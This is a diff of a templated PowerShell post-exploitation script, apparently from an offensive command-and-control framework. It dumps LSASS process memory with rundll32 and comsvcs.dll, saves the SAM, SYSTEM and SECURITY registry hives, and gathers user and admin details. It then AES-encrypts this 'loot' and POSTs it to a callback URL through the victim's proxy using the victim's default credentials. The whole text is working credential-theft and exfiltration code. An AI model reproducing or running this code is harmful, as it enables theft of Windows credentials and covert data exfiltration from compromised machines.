@@ -18,6 +18,27 @@ $ErrorActionPreference = "Stop"
 $PS_VERSION = $PSVersionTable.PSVersion.Major
 {{'$DebugPreference = "Continue"'|debug}}
 
+function Encrypt-AES {
+    param(
+        [Byte[]]$buffer,
+        [Byte[]]$key
+  	)
+
+    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
+    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+    $aesManaged.BlockSize = 128
+    $aesManaged.KeySize = 128
+    $aesManaged.Key = [byte[]]$key[0..15]
+
+    $encryptor = $aesManaged.CreateEncryptor()
+    $encryptedData = $encryptor.TransformFinalBlock($buffer, 0, $buffer.Length);
+    [byte[]] $fullData = $aesManaged.IV + $encryptedData
+
+    try{$aesManaged.Dispose()}catch{} {# This method does not exist in PS2 #}
+    $fullData
+}
+
 function Unzip-Code {
      Param ( [byte[]] $byteArray )
      if ($PS_VERSION -eq 2) {
@@ -463,7 +484,8 @@ function Send-Bytes {
         $FileName = Get-Date -Format o
     }
 
-    $Body = (Decrypt-Code $Body $KEY)
+    {{'Write-Debug "Encrypting $Filename..."'|debug}}
+    $Body = (Encrypt-AES $Body $KEY)
 
     if ("{{transport}}" -match "^https?$") {
         Send-BytesViaHttp -LootId $LootId $Body $FileName
@@ -493,6 +515,7 @@ function Send-BytesViaHttp {
     $prebody = [System.Text.Encoding]::UTF8.GetBytes($prebody)
     $postbody = [System.Text.Encoding]::UTF8.GetBytes($postbody)
 
+    $ProgressPreference = 'SilentlyContinue'
     $post_url = "$(${CALLBACK_URL})u?script"
     if ($LootId) { $post_url += "&loot=$LootId" }
     {{'Write-Debug "POSTing the file to $post_url..."'|debug}}
@@ -500,6 +523,7 @@ function Send-BytesViaHttp {
     $WebRequest.Method = "POST"
     $WebRequest.ContentType = "multipart/form-data; boundary=`"$boundary`""
     $WebRequest.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
+    $WebRequest.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
     $PostStream = $WebRequest.GetRequestStream()
     $PostStream.Write($prebody, 0, $prebody.Length)
     $PostStream.Write($Body, 0, $Body.Length)
@@ -654,11 +678,24 @@ Return some basic information about the underlying system
 
     $IPs = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | where {$_.DefaultIPGateway -ne $null}).IPAddress
     $SysInfo = (Get-WMIObject win32_operatingsystem)
+    $ComputerInfo = (Get-WMIObject win32_computersystem)
+    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+    $IsAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+    if ($PS_VERSION -eq 2) { $admins = "" } else {
+        $admins = (Get-LocalGroupMember -Sid S-1-5-32-544);
+    }
     return  New-Object psobject -Property @{
         name = $SysInfo.name.split('|')[0];
         arch = $SysInfo.OSArchitecture;
         version = $SysInfo.version;
         hostname = $SysInfo.csname;
+        manufacturer = $ComputerInfo.manufacturer;
+        model = $ComputerInfo.model;
+        username = $env:username;
+        userdomain = $env:userdomain;
+        isadmin = $IsAdmin;
+        admins = $admins;
         releaseid = (Get-Item "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion").GetValue('ReleaseID');
         IPs = $IPs
     }
@@ -683,10 +720,10 @@ Partially based on:
     $SysInfo = $SysInfo | ConvertTo-Csv -NoTypeInformation
 
 
-    $SamPath = Join-Path $env:TMP "sam"
-    $SystemPath = Join-Path $env:TMP "system"
-    $SecurityPath = Join-Path $env:TMP "security"
-    $SoftwarePath = Join-Path $env:TMP "software"
+    $SamPath = Join-Path $env:TMP "sam_$($LootId)"
+    $SystemPath = Join-Path $env:TMP "system_$($LootId)"
+    $SecurityPath = Join-Path $env:TMP "security_$($LootId)"
+    $SoftwarePath = Join-Path $env:TMP "software_$($LootId)"
     $DumpFilePath = $env:TMP
 
     $Process = Get-Process lsass
@@ -697,20 +734,23 @@ Partially based on:
     $ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName
 
     try {
-        {{'Write-Debug "Dumping Hives..."'|debug}}
-        & reg save HKLM\SAM $SamPath /y
-        & reg save HKLM\SYSTEM $SystemPath /y
-        & reg save HKLM\SECURITY $SecurityPath /y
-        & reg save HKLM\SOFTWARE $SoftwarePath /y
+        {{'Write-Debug "Dumping sysinfo..."'|debug}}
+        $SysInfo | PushTo-Hub -Name "sysinfo_$($LootId)" -LootId $LootId
 
         {{'Write-Debug "Dumping lsass to $ProcessDumpPath..."'|debug}}
         & rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $ProcessId $ProcessDumpPath full
         Wait-Process -Id (Get-Process rundll32).id
+        {{'Write-Debug "Sending lsass dump home..."'|debug}}
+        if (Test-Path $ProcessDumpPath) { PushTo-Hub -LootId $LootId $ProcessDumpPath }
 
-        {{'Write-Debug "Dumping sysinfo..."'|debug}}
-        $SysInfo | PushTo-Hub -Name "sysinfo" -LootId $LootId
-        {{'Write-Debug "Sending dumps home..."'|debug}}
-        Foreach ($f in $SamPath, $SystemPath, $SecurityPath, $SoftwarePath, $ProcessDumpPath) {
+        {{'Write-Debug "Dumping Hives..."'|debug}}
+        & reg save HKLM\SAM $SamPath /y
+        & reg save HKLM\SYSTEM $SystemPath /y
+        & reg save HKLM\SECURITY $SecurityPath /y
+        # & reg save HKLM\SOFTWARE $SoftwarePath /y
+
+        {{'Write-Debug "Sending hive dumps home..."'|debug}}
+        Foreach ($f in $SamPath, $SystemPath, $SecurityPath, $SoftwarePath ) {
             if (Test-Path $f) { PushTo-Hub -LootId $LootId $f }
         }
     } finally {
